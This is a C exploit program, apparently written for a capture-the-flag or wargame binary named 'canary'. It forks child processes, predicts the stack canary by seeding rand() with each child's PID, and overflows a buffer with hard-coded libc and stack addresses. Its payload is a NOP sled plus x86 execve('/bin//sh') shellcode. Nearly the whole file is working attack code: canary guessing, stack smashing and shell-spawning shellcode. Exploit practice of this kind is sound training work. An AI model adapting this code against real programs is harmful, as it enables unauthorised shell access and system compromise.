#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char getchar_int(int a, int pos)
{
    return (a>>(8*pos))&0xff;
}

int string_to_int(char str[4])
{
    int ret = 0, i = 0;
    for(;i<4;i++)
        ret += (((int)str[i]+1)<<(8*i));
    return ret;
}

void int_to_string(int a, char str[4])
{
    int i = 0;
    for(;i<4;i++)
        str[i] = getchar_int(a,i);
}

int boundedrand( int min, int max )
{
	return min + (int)((float)max * (rand() / (RAND_MAX + (float)min)));
}

int main()
{
    char str[5] = "";
    str[4] = 0;
    char str2[5] = "";
    str2[4] = 0;
    int base = string_to_int("\x74\xec\xff\xff");

    int i=0;
    for(i=-500;i<500;i++)
    {
        int id = fork();

        if(id<0)
        {
            printf("Error forking\n");
            return -1;
        }
        else if(id)
        {
            wait(NULL);
        }
        else
        {
            int pid = getpid();
            srand(pid);
            int stackguard = rand();
            int null_chr = boundedrand(0,3);
            int_to_string(base+i,str);
            int_to_string(base+i-12*16,str2);
            //printf("%08x %d %08x\n",stackguard,null_chr,*((int*)str));
            char buf1[200], buf2[200];
            //puts : 0xf7e59b20
            //system : 0xf7e32e80
            //exit : 0xf7e25c50
            //str : 0xffffec74
            //shellcode : 0xffffec
            sprintf(buf1,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%caaaaaaaaaaaa%s\x50\x5c\xe2\xf7%s",getchar_int(stackguard,0),getchar_int(stackguard,1),getchar_int(stackguard,2),getchar_int(stackguard,3),str2,str);
            switch(null_chr)
            {
                case 0:
                    sprintf(buf2,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80");
                    break;
                case 1:
                    sprintf(buf2,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80%c",getchar_int(stackguard,0));
                    break;
                case 2:
                    sprintf(buf2,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80%c%c",getchar_int(stackguard,0),getchar_int(stackguard,1));
                    break;
                default:
                    sprintf(buf2,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80%c%c%c",getchar_int(stackguard,0),getchar_int(stackguard,1),getchar_int(stackguard,2));
                    break;
            }
            char* argv[] = {"/home/classic3/canary",buf1,buf2,NULL};
            if(execv("/home/classic3/canary",argv)<0)
            {
                printf("Error exec\n");
                return -1;
            }
        }
    }

    return 0;
}
